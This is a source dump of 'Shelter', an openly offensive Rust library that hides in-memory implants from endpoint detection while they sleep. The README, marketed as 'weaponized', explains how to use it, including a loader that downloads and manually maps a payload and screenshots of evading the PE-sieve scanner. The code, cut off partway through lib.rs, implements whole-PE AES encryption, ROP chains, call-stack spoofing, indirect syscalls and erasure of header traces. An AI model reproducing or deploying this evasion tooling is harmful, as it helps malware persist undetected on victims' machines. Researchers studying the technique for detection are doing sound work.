Project Path: arc_gmh5225_Shelter_y0plohlh

Source Tree:

```txt
arc_gmh5225_Shelter_y0plohlh
├── Cargo.toml
├── LICENSE
├── README.md
├── build.rs
├── images
│   ├── current_PE1.2.PNG
│   ├── current_PE1.PNG
│   ├── current_PE2.PNG
│   ├── entire_PE.PNG
│   ├── high_entropy.PNG
│   └── high_entropy2.PNG
└── src
    ├── lib.rs
    └── stub.asm

```

`Cargo.toml`:

```toml
[package]
name = "shelter"
version = "0.1.0"
edition = "2021"

[profile.dev]
debug-assertions = false

[profile.release]
debug-assertions = false # required to avoid misaligned pointer dereference panics
strip = true  

[dependencies]
dinvoke_rs = "0.1.4"
litcrypt2 = "0.1.2"
nanorand = "0.7.0"
unwinder = "0.1.1"

[build-dependencies]
cc = "1.0.83"

[dependencies.windows]
version = "0.51"
features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System",
    "Win32_System_IO",
    "Win32_System_Kernel",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_WindowsProgramming",
    "Wdk_Foundation",
    "Win32_Storage_FileSystem",
    "Win32_System_Memory",
    "Win32_System_SystemInformation",
]
```

`LICENSE`:

```
                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright 2024 Kurosh Dabbagh Escalante & Inés Martín Mínguez

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

```

`README.md`:

```md
# Shelter
Shelter is a completely weaponized sleep obfuscation technique that allows to fully encrypt your in-memory payload making an extensive use of ROP.

This crate comes with the following characteristics:
* AES-128 encryption.
* Whole PE encryption capability.
* Removal of execution permission during sleep time.
* No APC/HWBP/Timers used, exclusive use of ROP to achieve the obfuscation.
* Use of [Unwinder](https://github.com/Kudaes/Unwinder) to achieve call stack spoofing before executing the ROP chain.
* Different methods of execution to adapt to various circumstances.
* Other OPSEC considerations: [DInvoke_rs](https://github.com/Kudaes/DInvoke_rs), indirect syscalls, string literals encryption, etc.  
  

### Content
- [Usage](#usage)
- [Examples](#examples)
  - [fluctuate](#fluctuate)
  - [fluctuate_from_address](#fluctuate_from_address)
  - [fluctuate_from_pattern](#fluctuate_from_pattern)
- [Testing the module](#Testing-the-module)
- [TO-DO](#TO-DO)
<br>

---

## Usage

Import this crate into your project by adding the following line to your `cargo.toml`:

```rust
[dependencies]
shelter = "0.1.0"
```
Then, compile your project on `--release` mode.

The main functionality of this crate has been wrapped in three functions:
* `fluctuate()` allows to encrypt either the current memory region or the whole PE. This function requires the PE's MZ bytes to be present in order to dynamically retrieve its base address.
* `fluctuate_from_address()` completely encrypts the PE. This function expects as input parameter the PE's base address.
* `fluctuate_from_pattern()` also completely encrypts the PE. This function expects as input parameter a custom set of two bytes to use to determine the PE's base address. These custom magic bytes replace the classic MZ pattern.

Whenever the whole PE is encrypted, the original sections' memory protections are stored in the heap in order to restore them afterwards. 

Shelter uses [NtWaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntwaitforsingleobject) to sleep. In addition to indicating how many seconds you want to sleep, you can also pass an event handle and signal it at any time to return before the timeout expires (using [SetEvent](https://learn.microsoft.com/es-es/windows/win32/api/synchapi/nf-synchapi-setevent) for example). Take into account that if your whole payload is encrypted (which is the whole point I guess), you will need an alternative way to signal the event in case that you have slept indefinitely.  
<br>


## Examples
### fluctuate 

The function expects the following parameters:
* A boolean value indicating whether encrypt the whole PE or just the current memory region. Passing `true` requires the MZ bytes to be present in memory.
* The number of seconds that the program will sleep for. If it is left to `None`, the timeout will be infinite, which means the execution will not return until the event passed to NtWaitForSingleObject is signaled.
* An event handle to be passed to NtWaitForSingleObject. This parameter can be `None`. The program will get stuck if you set this parameter and the timeout both to `None`.

```rust
let time_to_sleep = Some(10); // Sleep for 10 seconds
let _ = shelter::fluctuate(false, time_to_sleep, None); // Encrypt only the current memory region
```
```rust
let time_to_sleep = Some(10); // Sleep for 10 seconds
let _ = shelter::fluctuate(true, time_to_sleep, None); // Encrypt the whole PE
```
```rust
pub type CreateEventW = unsafe extern "system" fn (*const SECURITY_ATTRIBUTES, i32, i32, *const u16) -> HANDLE;

let k32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll"); 
let create_event: CreateEventW;
let event_handle: Option<HANDLE>;
dinvoke_rs::dinvoke::dynamic_invoke!(k32,"CreateEventW",create_event,event_handle,ptr::null_mut(),0,0,ptr::null());
let time_to_sleep = None; // Sleep indefinitely
let _ = shelter::fluctuate(true, time_to_sleep, event_handle); // Encrypt the whole PE until the event is signaled
```
<br>

### fluctuate_from_address

The function expects the following parameters:
* The number of seconds that the program will sleep for. If it is left to `None`, the timeout will be infinite, which means the execution will not return until the event passed to NtWaitForSingleObject is signaled.
* An event handle to be passed to NtWaitForSingleObject. This parameter can be `None.` The program will stuck if you set this parameter and the timeout both to `None`.
* The base address from which the PE is mapped. 

One way to use this function would be to manually map our payload with `Dinvoke_rs`. This way, the loader can send the payload its own base address, so then the payload can use it to obfuscate itself whenever is needed. This way, the loader can safely remove the PE's headers in order to achieve a certain level of stealthiness.

Loader example:

```rust
let payload: Vec<u8> = your_download_function();
let mut m = dinvoke_rs::manualmap::manually_map_module(payload.as_ptr(), true).unwrap();
println!("The dll is loaded at base address 0x{:x}", m.1);
let dll_exported_function = dinvoke::get_function_address(m.1, "run");

let run: unsafe extern "Rust" fn (usize) = std::mem::transmute(dll_exported_function);
run(m.1 as usize);
```

Payload example: 

```rust
#[no_mangle]
fn run(base_address: usize)
{
	...
	let time_to_sleep = Some(10); // Sleep for 10 seconds
	let _ = shelter::fluctuate_from_address(time_to_sleep, None, base_address); // Encrypt the entire PE from this specific base address
	...
}
 ```
<br>

### fluctuate_from_pattern

The function expects the following parameters:
* The number of seconds that the program will sleep for. If it is left to `None`, the timeout will be infinite, which means the execution will not return until the event passed to NtWaitForSingleObject is signaled.
* An event handle to be passed to NtWaitForSingleObject. This parameter can be `None`. The program will stuck if you set this parameter and the timeout both to `None`.
* A `[u8;2]` array containig custom magic bytes to look for in order to obtain the PE's base address. 

The point of creating this function is to allow the loader to remove PE's header and other signatures, including the classic MZ bytes. This way, those bytes can be replaced by a custom pattern that Shelter will look for in order to retrieve the PE's base address.

```rust
let time_to_sleep = Some(10); // Sleep for 10 seconds
let pattern = [0x29,0x07];
let _ = shelter::fluctuate_from_pattern(time_to_sleep, None, pattern); // Encrypt the whole PE using custom pattern as magic bytes
```  
    
<br>

## Testing the module

In order to test the implementation of the technique, mainly [PE-sieve](https://github.com/hasherezade/pe-sieve) has been used. By default, PE-sieve looks for implants within executable memory regions, which means that even obfuscating exclusively the current memory region (`.text`) is enough to avoid detections:

![Current memory region obfuscation.](/images/current_PE1.PNG "Current memory region obfuscation")
![Current memory region obfuscation (Process Hacker).](/images/current_PE1.2.PNG "Current memory region obfuscation (Process Hacker)")

Notice that, since we are using `Unwinder`, the call stack is spoofed and therefore the flag `/threads` does not detect the mapped dll neither.

Now, PE-sieve allows to inspect non executable memory regions as well by using the `/data` flag. According to the [official documentation of the tool](https://github.com/hasherezade/pe-sieve/wiki/4.4.-Scan-non-executable-memory-(data)), this flag set to `always` can "produce a lot of noise/false positives". Despite that, we decided to use it in order to check the effectiveness of the whole PE encryption capability, since it allows to hide PE's data regions that could contain indicators of the presence of a in-memory implant.

![Current memory region obfuscation detected by PE-sieve.](/images/current_PE2.PNG "Current memory region obfuscation detected by PE-sieve")
![Entire PE obfuscation stays undetected.](/images/entire_PE.PNG "Entire PE obfuscation stays undetected")

As it can be seen, in the first picture it is shown how obfuscating just the `.text` section is not enough when PE-sieve scans non executable memory pages, since some regions could contain strings that reveal the presence of a DLL (MZ, DOS header, section names, etc.). On the other hand, the second image shows how this issue can be solved by using Shelter's whole PE obfuscation mechanism. In any case and as stated in the PE-sieve's wiki, this option leads to tons of false positive since the mere presence in the heap of strings like ".data" or "rdata" already warns of possible implanted PE, despite it is not able to dump anything from the memory (since there is not any real PE content in that region).

Finally, PE-sieve has a fairly new option to detect the presence of obfuscated implants by looking for high entropy memory regions. This option (`/obfusc`) in combination with `/data` is able to detect the presence of the payload due to the high entropy of the memory region that contains it (although it can't retrieve the PE since it's fully encrypted):

![Entire PE obfuscation detection.](/images/high_entropy.PNG "Entire PE obfuscation detection")
![Entire PE obfuscation (Process Hacker).](/images/high_entropy2.PNG "Entire PE obfuscation (Process Hacker)")
<br>

## TO-DO

Although Shelter is ready to use and it has been developed with OPSEC in mind, there are still some enhancements that will be added in the nearby future:
* Reduce entropy when the whole PE is encrypted.
* Replace `BCryptEncrypt`/`BCryptDecrypt` with the corresponding Nt function.
* Add some randomness to the gadget selection process.

## Previous work
* [Gargoyle](https://github.com/JLospinoso/gargoyle)
* [Ekko](https://github.com/Cracked5pider/Ekko)
* [Cronos](https://github.com/Idov31/Cronos)

```

`build.rs`:

```rs
fn main()
{
    // Use the `cc` crate to build a C file and statically link it.
    cc::Build::new()
        .file("src/stub.asm")
        .compile("stub");
}
```

`src/lib.rs`:

```rs
#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use nanorand::{Rng, WyRand, BufferedRng};
use std::ffi::CString;
use std::{ptr, mem};
use std::{ptr::copy_nonoverlapping, mem::size_of, ffi::c_void};
use std::mem::transmute;
use windows::Win32::{Foundation::HANDLE, System::{Diagnostics::Debug::{IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER}, SystemInformation::SYSTEM_INFO, Memory::MEMORY_BASIC_INFORMATION, Threading::GetCurrentProcess}};
use dinvoke_rs::data::{PVOID, PeMetadata, ImageFileHeader, ImageOptionalHeader64, EAT, SECTION_MEM_READ, SECTION_MEM_WRITE, SECTION_MEM_EXECUTE, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_WRITECOPY, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, BCryptOpenAlgorithmProvider, BCryptGetProperty, BCryptSetProperty, BCryptGenerateSymmetricKey, CreateEventW, BCryptCloseAlgorithmProvider, BCryptDestroyKey};

#[repr(C)]
struct RopConfiguration
{
    god_gadget: PVOID,
    gadget1: PVOID,
    gadget2: PVOID,
    gadget3: PVOID,
    gadget4: PVOID,
    gadget5: PVOID,
    gadget6: PVOID,
    gadget7: PVOID,
    gadget8: PVOID,
    gadget9: PVOID,

    ntprotectvm: usize,
    ntprotectvm_id: isize,
    processhandle: HANDLE,
    memory_protections: usize,
   
    ntwaitobj: usize,
    ntwaitobj_id: isize,
    objhandle: HANDLE,
    delay: *mut isize,

    bencrypt: usize,
    bdecrypt: usize,
    key_handle: PVOID, 
    iv_len: usize,
    output_var: PVOID, 
}

#[repr(C)]
struct SectionInfo{
    section_address: *mut PVOID,
    section_size: *mut usize,
    original_protection: usize,
    output: PVOID,
}

#[repr(C)]
struct SectionsWrapper {
    base_address: *mut PVOID,
    total_size: *mut usize,  
    iv_e: PVOID,
    iv_d: PVOID,
    n: usize,
    sec_size: usize,
    sections: Vec<SectionInfo>,
}

extern "C"
{
    fn SpoofAndCall(unwinder: usize, args: Vec<*mut c_void>, is_syscall: bool, id: u32);
    fn Fluctuate(config_structure: PVOID, sections_structure: PVOID);
}

/// Encrypt the whole PE. Use this function in order to specify a two bytes pattern that the library will look for to retrieve the module's base address. These two bytes replace
/// the classic MZ PE magic bytes, allowing you to remove PE headers to hide the pressence of the binary.
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
///   
///   - pattern: A two bytes pattern that will indicate the start of the PE in memory. The MZ magic bytes should be replaced by these two bytes. 
pub fn fluctuate_from_pattern(config_delay: Option<u32>, event_handle: Option<HANDLE>, pattern: [u8;2]) -> Result<(), String>
{
    fluctuate_core(true, config_delay, event_handle, 0, Some(pattern))
}

/// Encrypt the whole PE. Use this function in order to specify the base_address of the current PE, preventing the library from searching the MZ pattern. 
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
///   
///   - base_address: This is the PE base address. 
pub fn fluctuate_from_address(config_delay: Option<u32>, event_handle: Option<HANDLE>, base_adress: usize) -> Result<(), String>
{
    fluctuate_core(true, config_delay, event_handle, base_adress, None)
}

/// Encrypt either the current memory region or the whole PE. 
///  - config_encryptall: Encrypt all sections from the PE or just the current memory region where the main program resides.
///                       Keep in mind that, to be able to encrypt all sections, PE's magic bytes shouldn't be stripped.
///                       For more information check out the implementation of get_pe_baseaddress function. If the header is not
///                       found, the configuration will automatically change to encrypt only current memory region.
/// 
///  - config_delay:  Number of seconds that the program will sleep for. If it is left to None, the timeout will be infinite.
///                   For that option to work correctly, a valid event handle must be passed as an argument (event_handle), so the event can be
///                   properly signaled to resume the execution. Otherwise, this function will never return.
///
///   - event_handle: The NtWaitForSingleObject function is used to delay execution. If this parameter is set to None
///                   the function will automatically generate a new event to pass to NtWaitForSingleObject. If the caller wants to use a previously
///                   created event, its handle can be passed using this argument. 
pub fn fluctuate(config_encryptall: bool, config_delay: Option<u32>, event_handle: Option<HANDLE>) -> Result<(), String>
{
    fluctuate_core(config_encryptall, config_delay, event_handle, 0, None)
}

fn fluctuate_core(config_encryptall: bool, config_delay: Option<u32>, event_handle: Option<HANDLE>, specified_base_address: usize, pattern: Option<[u8;2]>) -> Result<(), String>
{
    let iv_size: usize = 16;
    let mut aes_128_key = [0u8; 16];
    let mut aes_iv = [0u8; 16]; 

    // Dynamically generate the encryption key and IV
    let mut rng = BufferedRng::new(WyRand::new());
    rng.fill(&mut aes_128_key);
    let mut aes_128_key: Vec<u8> = aes_128_key.to_vec();
    rng.fill(&mut aes_iv);
    let aes_iv: Vec<u8> = aes_iv.to_vec();

   unsafe
   {
        let mut configuration: RopConfiguration = std::mem::zeroed();
        
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll")); 
        let load_library_address = dinvoke_rs::dinvoke::get_function_address(k32, &lc!("LoadLibraryA"));
        let name = CString::new(lc!("bcrypt.dll")).expect("");

        // Use Unwinder to create a clean call stack before loading bcrypt.dll. This way, the call stack won't be a problem
        // when the LoadImage callback is analyzed by the EDR.
        let bcrypt = unwinder::call_function!(load_library_address, false, name.as_ptr() as *mut u8) as isize;
        if bcrypt == 0
        {
            return Err(lc!("[X] Error loading bcrypt into the current process."));
        }

        let alg_handle = HANDLE::default();
        let alg_handle: *mut HANDLE = transmute(&alg_handle);
        let mut alg_id: Vec<u16> = "AES".encode_utf16().collect(); // BCRYPT_AES_ALGORITHM
        alg_id.push(0);
        let flags = 0;
        let function: BCryptOpenAlgorithmProvider;
        let ret_value: Option<i32>;

        // Open a handle to the AES encryption provider
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptOpenAlgorithmProvider"),function,ret_value,alg_handle,alg_id.as_ptr(),ptr::null(),flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptOpenAlgorithmProvider."));
        }
        
        let mut bcrypt_object_length: Vec<u16> = "ObjectLength".encode_utf16().collect(); // BCRYPT_AES_ALGORITHM
        bcrypt_object_length.push(0);
        let cb_key_object = 0u32;
        let cb_key_object: *mut u8 = transmute(&cb_key_object);
        let buffer_size = 4u32;
        let cb_data = 0u32;
        let cb_data: *mut u32 = transmute(&cb_data);
        let flags = 0u32;
        let function: BCryptGetProperty;
        let ret_value: Option<i32>;

        // We obtain the size of the buffer where the encryption key is to be stored
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptGetProperty"),function,ret_value,*alg_handle,bcrypt_object_length.as_ptr(),cb_key_object,buffer_size,cb_data,flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptGetProperty."));
        }

        let cb_key_object = *(cb_key_object as *mut u32);
        let mut pb_key_object = vec![0u8;cb_key_object as usize];

        let mut bcrypt_chaining_mode: Vec<u16> = "ChainingMode".encode_utf16().collect(); // BCRYPT_CHAINING_MODE
        bcrypt_chaining_mode.push(0);
        let mut chaining_mode: Vec<u16> = "ChainingModeCBC".encode_utf16().collect(); // BCRYPT_CHAIN_MODE_CBC
        chaining_mode.push(0);
        let buffer_size = chaining_mode.len() as u32;
        let flags = 0u32;
        let function: BCryptSetProperty;
        let ret_value: Option<i32>;

        // We indicate the encryption provider that we want to use AES in CBC mode
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptSetProperty"),function,ret_value,*alg_handle,bcrypt_chaining_mode.as_ptr(),chaining_mode.as_mut_ptr() as *mut _,buffer_size,flags);
        if ret_value.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptSetProperty."));
        }
        
        let f: BCryptGenerateSymmetricKey;
        let r: Option<i32>;
        let key_handle = HANDLE::default();
        let key_handle : *mut HANDLE = transmute(&key_handle);
        let aes_key_len = aes_128_key.len() as u32;

        // Generate encryption key
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptGenerateSymmetricKey"),f,r,*alg_handle,key_handle,pb_key_object.as_mut_ptr(),cb_key_object,aes_128_key.as_mut_ptr(),aes_key_len,0);
        if r.unwrap() != 0
        {
            return Err(lc!("[X] Error while invoking BCryptGenerateSymmetricKey."));
        }

        let ntdll = dinvoke_rs::dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let ntdll_ba: *const u8 =  ntdll as _;
        let ntdll_pe_info = get_pe_metadata(ntdll_ba).unwrap();

        let ntdll_eat = dinvoke_rs::dinvoke::get_ntdll_eat(ntdll);
        let ntpvm_id = dinvoke_rs::dinvoke::get_syscall_id(&ntdll_eat, &lc!("NtProtectVirtualMemory"));
        let ntwaitobj_id = dinvoke_rs::dinvoke::get_syscall_id(&ntdll_eat, &lc!("NtWaitForSingleObject"));

        if ntpvm_id == u32::MAX || ntwaitobj_id == u32::MAX
        {
            return Err(lc!("[X] Couldn't retrieve SSNs."));
        }
        
        let mut syscall_addr1: usize = 0;
        let mut syscall_addr2: usize = 0;
        let ntprotectvm_address = dinvoke_rs::dinvoke::get_function_address(ntdll, &lc!("NtProtectVirtualMemory")) as *mut c_void;
        let ntwaitobj_address = dinvoke_rs::dinvoke::get_function_address(ntdll, &lc!("NtWaitForSingleObject")) as *mut c_void;

        // Check if functions were succesfully found
        if ntprotectvm_address != ptr::null_mut() {
            syscall_addr1 = get_syscall_addr(ntprotectvm_address as isize);
        }
        if ntwaitobj_address != ptr::null_mut() {
            syscall_addr2 = get_syscall_addr(ntwaitobj_address as isize);
        }

        // If the original syscall instruction is hooked/not found, then get a random one
        if syscall_addr1 == 0 {
            syscall_addr1 = get_random_syscall(&ntdll_eat);
        }

        if syscall_addr2 == 0 {
            syscall_addr2 = get_random_syscall(&ntdll_eat);
        }

        if syscall_addr1 == 0 || syscall_addr2 == 0
        {
            return Err(lc!("[X] Syscall gadgets not found."));
        }

        let sections_wrapper: SectionsWrapper;

        let mut page = 0usize; 
        let mut page_length = 0usize;
        let mut pe_base = 0usize;
        let mut total_size = 0usize;

        let mut config_encrypt_all_sections = config_encryptall;

        // In case parsing the header of the current PE fails, only the current section will be encrypted
        if config_encrypt_all_sections {
            if specified_base_address != 0
            {
                pe_base = specified_base_address;
            }
            else if pattern.is_some()
            {
                pe_base = get_pe_baseaddress(5, pattern.unwrap());
            }
            else 
            {
                pe_base = get_pe_baseaddress(5, [0x4D, 0x5A]);
            }

            if pe_base == 0 {
                config_encrypt_all_sections = false;
            }
        }

        if config_encrypt_all_sections 
        {
            let pe_ba: *const u8 =  std::mem::transmute(pe_base);
            let mut current_pe = get_pe_metadata(pe_ba).unwrap();

            // Array that will contain each SectionInfo
            let mut sections_array: Vec<SectionInfo> = vec![];

            // Retrieve the PE Header's section information
            let base_of_code;
            if current_pe.is_32_bit {
                base_of_code = current_pe.opt_header_32.BaseOfCode as usize;
            } else {
                base_of_code = current_pe.opt_header_64.base_of_code as usize;
            }

            let section_size: usize = base_of_code;
            let section_address: usize = pe_base;
            let section_protection: u32 = PAGE_READONLY;
            
            let mut new_section: SectionInfo = std::mem::zeroed();
            
            let alloc_base_address: Box<*mut c_void> = Box::new(section_address as *mut c_void);
            new_section.section_address = Box::into_raw(alloc_base_address);
            
            new_section.original_protection = section_protection as usize;
            
            let alloc_section_size: Box<usize> = Box::new(align_to_mempage(section_size));
            new_section.section_size = Box::into_raw(alloc_section_size);

            let alloc_output: Box<u32> = Box::new(0);
            new_section.output = Box::into_raw(alloc_output) as *mut c_void;

            sections_array.push(new_section);

            // Retrieve other sections' information
            //  This data needs to be stored in the heap. Otherwise, it will be overwritten by the next element of the loop.
            for section in current_pe.sections.iter_mut()
            {   

                let section_size: usize = section.Misc.VirtualSize as usize;
                let section_address: usize = pe_base + section.VirtualAddress as usize;

                let read = section.Characteristics.0 & SECTION_MEM_READ != 0;
                let write = section.Characteristics.0 & SECTION_MEM_WRITE != 0;
                let execute = section.Characteristics.0 & SECTION_MEM_EXECUTE != 0;
                let section_protection: u32;

                if read && !write && !execute {
                    section_protection = PAGE_READONLY;
                } else if read && write && !execute {
                    section_protection = PAGE_READWRITE;
                } else if read && write && execute {
                    section_protection = PAGE_EXECUTE_READWRITE;
                } else if read && !write && execute {
                    section_protection = PAGE_EXECUTE_READ;
                } else if !read && write && !execute {
                    section_protection = PAGE_WRITECOPY; 
                } else if !read && write && execute {
                    section_protection = PAGE_EXECUTE_WRITECOPY;  
                } else if !read && !write && execute {
                    section_protection = PAGE_EXECUTE;  
                } else {
                    continue
                }

                let mut new_section: SectionInfo = std::mem::zeroed();

                let alloc_base_address: Box<*mut c_void> = Box::new(section_address as *mut c_void);
                new_section.section_address = Box::into_raw(alloc_base_address);

                new_section.original_protection = section_protection as usize;

                let alloc_section_size: Box<usize> = Box::new(align_to_mempage(section_size));
                new_section.section_size = Box::into_raw(alloc_section_size);

                let alloc_output: Box<u32> = Box::new(0);
                new_section.output = Box::into_raw(alloc_output) as *mut c_void;

                sections_array.push(new_section); 

                // We force heap overwriting to prevent from leaving traces  
                for i in 0..8
                {
                    if section.Name[i] != 0{
                        section.Name[i] = 0;
                    }
                    else{
                        break;
                    }
                }
            }

            // Calculate the total size of the PE
            for s in &sections_array
            {
                total_size += *s.section_size;
            }

            let total: *mut usize = transmute(&total_size);
